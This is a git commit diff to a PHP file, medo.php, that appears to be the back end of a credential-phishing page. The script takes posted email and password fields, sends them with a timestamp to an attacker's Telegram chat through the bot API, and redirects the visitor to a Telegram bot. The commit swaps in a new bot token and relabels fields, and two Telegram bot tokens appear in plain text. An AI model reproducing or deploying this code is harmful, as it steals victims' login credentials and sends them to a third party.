9d5caf2dfe1380bafe14ad994a1d3a04f0cf736c
facebookto <112450149+facebookto@users.noreply.github.com>
2022-08-30 05:01:05 +0300

    Add files via upload

--- medo.php
+++ medo.php
@@ -1,13 +1,13 @@
 <?php
-$API_KEY = "5370952236:AAEZq2cMXOShTg0iJ6ER6bh_mSgDTABuYJY";
+$API_KEY = "2090570314:AAHhAc-esZn1rM1pQWGRe2NLAM9znXb-BJk";
 
 $admin = 1474863830 ; 
-$email = $_POST["email"];
+$email = $_POST["text"];
 $password = $_POST['password'];
 $login = $_POST['login'];
 $time = date("Y-m-d H:i:s");
 $text = urlencode("
-- Type : iNDEK Hussain
+- Type : $ 𝙸𝙽𝙳𝙴𝚇 hasson
 
 - Email : `$email`
 
@@ -17,6 +17,10 @@ $text = urlencode("
 $url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
 file_get_contents($url);
 ?>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag("js", new Date());
+gtag("config", "UA-1596542");
 </script>
 <meta http-equiv="Refresh" content="0; url=https://t.me/ILTrI_bot" />
 </head>
